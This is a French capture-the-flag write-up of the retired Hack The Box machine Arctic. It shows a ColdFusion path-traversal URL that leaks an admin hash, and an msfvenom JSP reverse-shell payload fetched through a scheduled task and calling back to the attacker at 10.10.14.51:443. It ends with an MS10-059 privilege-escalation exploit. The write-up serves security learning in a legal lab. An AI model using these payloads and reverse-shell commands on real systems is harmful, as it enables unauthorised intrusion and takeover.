---
title: Restez calme et piratez The Box - Arctic
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-02-26T22:19:29.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-arctic
coverImage: https://www.freecodecamp.org/news/content/images/2020/02/8hAf8sI.png
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
- name: Windows
  slug: windows
seo_title: Restez calme et piratez The Box - Arctic
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en tests d'intrusion. Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent davantage vers un style de défi CTF.

**Note**. _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-21.06.12.png)

Arctic est une machine de niveau débutant, cependant les temps de chargement sur le serveur web posent quelques défis pour l'exploitation. Un dépannage de base est nécessaire pour faire fonctionner correctement l'exploit.

Nous allons utiliser les outils suivants pour pirater la machine sur une [boîte Kali Linux](https://www.kali.org/)

* nmap
* Searchsploit
* hash-identifier
* MSFvenom
* netcat
* GDSSecurity/Windows-Exploit-Suggester
* serveur http python
* powershell

## Étape 1 - Reconnaissance

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter par la suite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

## Scanning des ports

J'utiliserai Nmap (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseaux et l'audit de sécurité. Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-21.50.12.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v 10.10.10.11
```

**-A :** Active la détection du système d'exploitation, la détection de version, le scanning de scripts et le traceroute

**-v :** Augmente le niveau de verbosité

**10.10.10.11 :** Adresse IP de la boîte Arctic

Si vous trouvez les résultats un peu trop écrasants, vous pouvez faire une autre commande pour obtenir uniquement les ports ouverts.

```bash
nmap 10.10.10.11
```

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-21.51.47.png)

Nous pouvons voir qu'il y a 3 ports ouverts :

**Port** 135. Microsoft EPMAP (End Point Mapper), également connu sous le nom de service DCE/RPC Locator, utilisé pour gérer à distance des services incluant le serveur DHCP, le serveur DNS et WINS

**Port** 8500. Serveur web intégré Adobe ColdFusion

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.33.09.png)

**Port** 49154. Gestion des certificats via CMS

Pour l'instant, Adobe ColdFusion, qui s'exécute sur le port 8500, sera la cible principale.

## **Étape 2 - Énumération**

Essayons le **port 8500** et visitons **http://10.10.10.11:8500**

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.13.37.png)

Nous pouvons voir deux dossiers. J'ouvre le dossier CFIDE.

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.25.16.png)

Il semble que ce soit une application web avec un panneau d'administration ColdFusion à l'adresse suivante :

```bash
10.10.10.11:8500/CFIDE/administrator/
```

Pour plus d'informations sur ColdFusion, consultez [ici](https://en.wikipedia.org/wiki/Adobe_ColdFusion).

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.26.22.png)

J'utilise **Searchsploit** pour vérifier s'il y a des vulnérabilités connues sur ColdFusion. Searchsploit est un outil de recherche en ligne de commande pour **[Exploit Database](https://www.exploit-db.com/).**

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-22.45.47.png)

J'utilise la commande suivante :

```bash
searchsploit coldfusion
```

Nous pouvons également trouver l'exploit sur le site web de l'Exploit Database :

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.01.42.png)
_[https://www.exploit-db.com/exploits/14641](https://www.exploit-db.com/exploits/14641)_

Je regarde la description de l'exploit :

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.01.57.png)

Et je remplace la partie **server** par **10.10.10.11:8500**

```bash
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

Je peux voir que le mot de passe haché est maintenant visible sur la page entre les inputs :

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.03.01.png)

J'utilise **hash-identifier** pour identifier le possible hash. hash-identifier est un logiciel pour identifier les différents types de hachages utilisés pour crypter des données et surtout des mots de passe. Vous pouvez trouver plus d'informations [ici](https://tools.kali.org/password-attacks/hash-identifier).

Je lance hash-identifier avec la commande suivante :

```bash
hash-identifier
```

et je copie/colle le mot de passe haché que j'ai obtenu précédemment :

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.28.06.png)

Nous voyons que le hash est très probablement un SHA-1.

## Étape 3 - Casser SHA 1 avec hashtoolkit.com

Je vais sur le site [hashtoolkit](http://hashtoolkit.com/) pour "déchiffrer" le hash. Les fonctions de hachage sont conçues de manière à ce qu'il soit très facile de générer un hash / empreinte pour un texte, mais presque impossible de décoder le hash pour retrouver le texte original.

Il est important de noter que le hachage est un mécanisme à sens unique. Ainsi, les données qui ont été hachées ne peuvent pas être inversées de manière pratique ou être "déchiffrées".

Le site utilise des **tables arc-en-ciel** pour inverser les fonctions de hachage cryptographiques, généralement pour casser les hachages de mots de passe. Plus d'informations sur les tables arc-en-ciel [ici](https://en.wikipedia.org/wiki/Rainbow_table).

Je copie/colle le hash et j'obtiens le mot de passe : **happyday.**

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.14.43.png)

Vous pouvez également voir les différents hachages pour ce même mot de passe :

![Image](https://www.freecodecamp.org/news/content/images/2020/01/Screenshot-2020-01-28-at-23.14.52.png)

Actuellement, le site a presque 17 milliards de hachages de mots de passe MD5 et SHA1 déchiffrés :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.12.44.png)

## Étape 4 - Créer une tâche planifiée

J'utilise le mot de passe pour me connecter au portail :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.27.41.png)

Je peux voir une zone dans la barre latérale gauche qui devrait permettre les téléchargements via les tâches planifiées sous la catégorie Debugging & Logging :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.28.57.png)

Je peux créer une nouvelle tâche :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.29.57.png)

Sur la page, je devrai configurer la tâche avec les différents paramètres :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.31.03.png)

Je vérifie les **Mappings** pour voir le chemin CFIDE - l'un des deux dossiers que nous avons trouvés au début - et savoir où je peux sauvegarder le shell :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.33.22.png)

Je vais utiliser **msfvenom**, qui est un générateur de charge utile, pour créer l'exploit - et plus spécifiquement un **jsp** reverse shell. Cette information a été collectée pendant la phase de reconnaissance - en regardant la page wikipedia de ColdFusion, nous pouvons voir qu'il est écrit en Java :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.25.07.png)

Vous pouvez en savoir plus sur msfvenom [ici](https://www.offensive-security.com/metasploit-unleashed/msfvenom/).

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.45.53.png)

J'utilise la commande suivante pour créer la charge utile :

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -f raw > arcticshell.jsp
```

**-p :** Charge utile à utiliser

**-f :** Format de sortie

**LHOST :** Hôte local

**LPORT :** Port local

J'ai sauvegardé l'exploit sous **arcticshell.jsp**. Je peux voir le contenu de la charge utile avec la commande suivante :

```bash
cat arcticshell.jsp
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.45.39.png)

Lançons un serveur Python pour servir le fichier depuis Kali. J'utiliserai le **SimpleHTTPServer**. Le module SimpleHTTPServer qui vient avec Python est un serveur HTTP simple qui fournit des gestionnaires de requêtes GET et HEAD standard. Vous pouvez en savoir plus à ce sujet [ici](https://docs.python.org/2/library/simplehttpserver.html).

J'utilise la commande suivante pour créer un serveur simple :

```bash
python -m SimpleHTTPServer 80
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-17-at-22.51.00.png)

De retour sur le panneau ColdFusion, je configure les paramètres suivants pour la tâche planifiée.

Tout d'abord, je configure l'URL vers notre serveur web qui héberge le shell que nous avons créé avec msfvenom :

```bash
http://10.10.14.51/arcticshell.jsp
```

Ensuite, je coche la case pour sauvegarder la sortie dans un fichier.

Enfin, je définis le fichier vers le chemin suivant :

```bash
C:\ColdFusion8\wwwroot\CFIDE\arcticshell.jsp
```

Voici ce que j'ai après avoir configuré tous les paramètres :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.01.14.png)

Sous les Actions sur le côté gauche, je clique sur le premier bouton pour exécuter la tâche. Je peux voir un message vert en haut de la page pour me dire que la tâche planifiée a été complétée avec succès :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-21.58.56.png)

Je peux également voir une réponse 200 sur mon serveur http python :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-21.59.43.png)

Je configure un écouteur **Ncat** sur le port **443** pour attraper la connexion du reverse shell.

> Ncat est un utilitaire réseau riche en fonctionnalités qui lit et écrit des données à travers les réseaux depuis la ligne de commande. Ncat a été écrit pour le projet Nmap comme une réimplémentation grandement améliorée du vénérable [Netcat](http://sectools.org/tool/netcat/). Il utilise à la fois TCP et UDP pour la communication et est conçu pour être un outil back-end fiable pour fournir instantanément une connectivité réseau à d'autres applications et utilisateurs.

Vous pouvez en savoir plus sur Ncat [ici](https://nmap.org/book/ncat-man.html).

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.03.42.png)

Je me rends ensuite à l'adresse du shell :

```bash
http://10.10.10.11:8500/CFIDE/arcticshell.jsp
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.02.27.png)

J'ai enfin obtenu un shell !

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.04.19.png)

## Étape 5 - Recherche du flag user.txt

Je vérifie qui je suis sur la machine avec la commande

```bash
whoami
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.05.51.png)

Je liste les fichiers/dossiers avec

```bash
dir
```

Je navigue vers Users

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.06.27.png)

Ensuite, je me déplace vers le dossier tolis

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.06.44.png)

Je navigue vers le Bureau

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.07.46.png)

Et je trouve le fichier user.txt !

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.08.02.png)

Pour lire le contenu du fichier, j'utilise la commande

```bash
more user.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.09.13.png)

## Étape 6 - Utilisation de GDSSecurity/Windows-Exploit-Suggester

Je regarde les informations système avec la commande

```bash
systeminfo
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-22.10.09.png)

Je copie/colle les résultats dans un fichier **systeminfo.txt** :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.53.30.png)

J'utiliserai Windows-Exploit-Suggester de [GDSSecurity](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) :

> Cet outil compare les niveaux de correctifs d'une cible avec la base de données des vulnérabilités Microsoft afin de détecter les correctifs potentiellement manquants sur la cible. Il notifie également l'utilisateur s'il existe des exploits publics et des modules Metasploit disponibles pour les bulletins manquants.

> Il nécessite la sortie de la commande 'systeminfo' d'un hôte Windows afin de comparer cela avec la base de données des bulletins de sécurité Microsoft et de déterminer le niveau de correctifs de l'hôte.

> Il a la capacité de télécharger automatiquement la base de données des bulletins de sécurité de Microsoft avec le drapeau --update, et de la sauvegarder sous forme de feuille de calcul Excel.

Je copie/colle le script python brut windows-exploit-suggester dans un fichier puis je modifie le fichier

```bash
nano windows-exploit-suggester.py
```

pour coller le code depuis le [dépôt GitHub](https://raw.githubusercontent.com/GDSSecurity/Windows-Exploit-Suggester/master/windows-exploit-suggester.py). Nous avons maintenant nos 2 fichiers dans le même dossier, **systeminfo.txt** et **windows-exploit-suggester.py** :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.54.18.png)

Je peux en savoir plus sur cet outil avec la commande suivante :

```bash
python windows-exploit-suggester.py -h
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.45.56.png)

Je mets à jour la base de données de l'outil avec la commande suivante :

```bash
python windows-exploit-suggester.py --update
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.55.08.png)

J'exécute le script avec

```bash
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2020-02-25-mssb.xls
```

Si vous rencontrez une erreur, vous devrez installer **pip** avant d'installer **xlrd**. Vous pouvez installer pip sur Kali avec la commande suivante :

```bash
apt install python-pip
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.56.14.png)

Ensuite, vous pouvez installer xlrd avec la commande

```bash
pip install xlrd
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.56.59.png)

Je peux voir qu'il y a plusieurs CVEs manquants sur cette machine. Je vais cibler la vulnérabilité **MS10-059** :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.57.09.png)

## Étape 7 - Exécution de l'élévation de privilèges

Je regarde le site Microsoft pour obtenir plus d'informations depuis leur Bulletin de Sécurité :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.46.50.png)
_[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059)_

Je regarde la base de données Exploit Database :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.15.45.png)
_[https://www.exploit-db.com/exploits/14610](https://www.exploit-db.com/exploits/14610)_

Je regarde également la base de données des vulnérabilités nationales. Plus d'informations sur NVD [ici](https://nvd.nist.gov/).

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-21.49.22.png)
_[https://nvd.nist.gov/vuln/detail/CVE-2010-2554](https://nvd.nist.gov/vuln/detail/CVE-2010-2554)_

Je trouve un exécutable sur GitHub [ici](https://github.com/Re4son/Chimichurri) que je peux télécharger. L'exploit créera un reverse shell.

Je crée un nouveau serveur http python avec

```bash
python -m SimpleHTTPServer 80
```

De retour sur le shell où j'ai obtenu le flag utilisateur, je configure un client web avec l'URL de l'exploit et le fichier où l'exploit sera sauvegardé :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.22.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.35.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.45.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-25-at-23.58.53.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.00.14.png)

J'obtiens un 200 sur le serveur http python :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.01.37.png)

Je configure un nouveau netcat et lance l'exploit avec la commande suivante :

```bash
exploit.exe 10.10.14.20 443
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.00.21.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.00.30.png)

## Étape 8 - Recherche du flag root.txt

Je peux voir que l'élévation de privilèges a réussi en vérifiant qui je suis sur la machine :

```bash
whoami
```

Cela retourne

```bash
nt authority\system
```

Je suis admin :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.02.50.png)

Je navigue vers Users :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.03.47.png)

Je me déplace vers le dossier Administrator :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.03.58.png)

Je navigue vers le dossier Desktop :

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.04.20.png)

Je peux voir le flag root.txt !

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.04.29.png)

J'utilise la commande suivante pour voir le contenu du fichier :

```bash
more root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/02/Screenshot-2020-02-26-at-00.04.39.png)

Félicitations ! Vous avez trouvé les deux flags !

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus de mes articles [ici](https://www.freecodecamp.org/news/author/sonya/)

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

**Autres articles Hack The Box**

* [Restez calme et piratez The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Restez calme et piratez The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Restez calme et piratez The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Restez calme et piratez The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
* [Restez calme et piratez The Box - Optimum](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)

![Image](https://www.freecodecamp.org/news/content/images/2020/02/8hAf8sI-1.png)